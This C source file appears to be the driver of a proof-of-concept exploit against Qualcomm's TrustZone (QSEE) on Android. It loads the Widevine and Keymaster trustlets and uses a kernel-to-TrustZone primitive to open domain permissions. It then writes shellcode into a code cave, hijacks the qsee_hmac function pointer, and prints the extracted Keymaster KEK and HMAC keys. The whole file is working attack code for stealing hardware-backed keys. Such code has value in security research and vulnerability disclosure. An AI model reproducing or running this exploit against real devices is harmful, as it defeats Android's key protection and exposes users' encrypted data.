#include <sys/types.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include "QSEEComAPI.h"
#include "symbols.h"
#include "widevine_commands.h"
#include "vuln.h"
#include "defs.h"
#include "exploit_utilities.h"
#include "keymaster_common.h"
#include "keymaster_qcom.h"
#include "keymaster_commands.h"
#include "tzbsp_exploit.h"
#include "tzbsp_symbols.h"
#include "qsee_syscalls.h"

int main() {

	//Getting the global handle used to interact with QSEECom
	struct qcom_wv_handle* wv_handle = initialize_wv_handle();
	struct qcom_keymaster_handle* km_handle = initialize_keymaster_handle();
	if (wv_handle == NULL || km_handle == NULL) {
		perror("[-] Failed to initialize QSEECom handles");
		return -errno;
	}

	//Loading the widevine application
	int res = (*wv_handle->QSEECom_start_app)((struct QSEECom_handle **)&wv_handle->qseecom,
  											  WIDEVINE_PATH, WIDEVINE_APP_NAME, WIDEVINE_BUFFER_SIZE);
	if (res < 0) {
		perror("[-] Failed to load Widevine");
		return -errno;
	}
	printf("[+] Widevine load res: %d\n", res);

	//Loading the keymaster application
	res = (*km_handle->QSEECom_start_app)((struct QSEECom_handle **)&km_handle->qseecom,
  										  KEYMASTER_PATH, KEYMASTER_APP_NAME, KEYMASTER_BUFFER_SIZE);
	if (res < 0) {
		perror("[-] Failed to load Keymaster");
		return -errno;
	}
	printf("[+] Keymaster load res: %d\n", res);

	//Finding the Widevine application within the secure app region
	void* app = find_widevine_application(wv_handle);
	if (!app) {
		perror("[-] Failed to find application\n");
		(*wv_handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&wv_handle->qseecom);
		return -ENOENT;
	}
	printf("[+] Found application at: %p\n", app);

	//Setting the DACR to be fully enabled
    //So that we can read and modify loaded application code
    tzbsp_execute_function(wv_handle, app, TZBSP_SET_DACR, 1, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0);
    printf("[+] Enabled all domain permissions\n");

	//Writing shellcode to extract both keys from the KeyMaster application!
	printf("[+] Writing shellcode to code cave\n");
	int fd = open("shellcode.bin", O_RDONLY);
	if (fd < 0) {
		perror("[-] Failed to open shellcode binary, aborting.\n");
		return -ENOENT;
	}
	struct stat st;
	fstat(fd, &st);
	char* buffer = malloc(st.st_size);
	read(fd, buffer, st.st_size);
	close(fd);
	tzbsp_write_range(wv_handle, app, CAVE_ADDR, buffer, st.st_size);

	//Flush & Invalidate the data cache
    tzbsp_execute_function(wv_handle, app, FLUSH_DATA_CACHE,
						  (CAVE_ADDR) & (~0xFFF), PAGE_SIZE,
						  0, 0, 0, 0, 0, 0);
    tzbsp_execute_function(wv_handle, app, INVALIDATE_DATA_CACHE,
						  (CAVE_ADDR) & (~0xFFF), PAGE_SIZE,
						  0, 0, 0, 0, 0, 0);

    //Re-writing the qsee_hmac function pointer with a pointer to the written function
	printf("[+] Overwriting qsee_hmac function pointer\n");
    tzbsp_write_dword(wv_handle, app, CAVE_ADDR + 1, QSEE_HMAC_FUNCPTR);

    //Generating another key! This one should have some interesting data...
	uint8_t* key_blob = NULL;
	size_t key_blob_length = 0;
    generate_keymaster_key(km_handle, &key_blob, &key_blob_length);
	
	//Extracting the keys from the key-blob
	printf("-----------------------------------------------\n");
	printf("[+] Leaked KeyMaster Keys!\n");

	printf("[+] KeyMaster Key Encryption Key (KEK): ");
	for (uint32_t i=0; i<KEK_LENGTH; i++)
		printf("%02X", key_blob[i]);
	printf("\n");

	printf("[+] KeyMaster HMAC Key: ");
	for (uint32_t i=0; i<HMAC_KEY_LENGTH; i++)
		printf("%02X", key_blob[KEK_LENGTH + i]);
	printf("\n");

	//Unloading the widevine app
	res = (*wv_handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&wv_handle->qseecom);
	printf("[+] Widevine unload res: %d\n", res);

	return 0;

}
